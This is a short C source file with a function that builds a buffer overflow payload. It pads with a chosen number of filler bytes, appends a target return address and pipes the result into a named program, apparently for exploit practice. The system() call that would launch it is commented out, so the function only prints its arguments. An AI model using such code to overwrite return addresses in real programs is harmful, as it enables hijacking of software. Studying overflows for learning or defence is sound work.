#include <stdio.h>

void override_return(char* prgrm, int offset, char* address){
          int len = strlen(prgrm);
          char cmd[10000] = "echo \"";
          for (int i = 0; i < offset; i++) {
               strcat(cmd, "\x65");
          }
          strcat(cmd, address);
          strcat(cmd, " | .\\");
          strcat(cmd, prgrm);
          /*system(cmd);*/

          printf("override return received: %s, %s, %d\n", prgrm, address, offset);
}
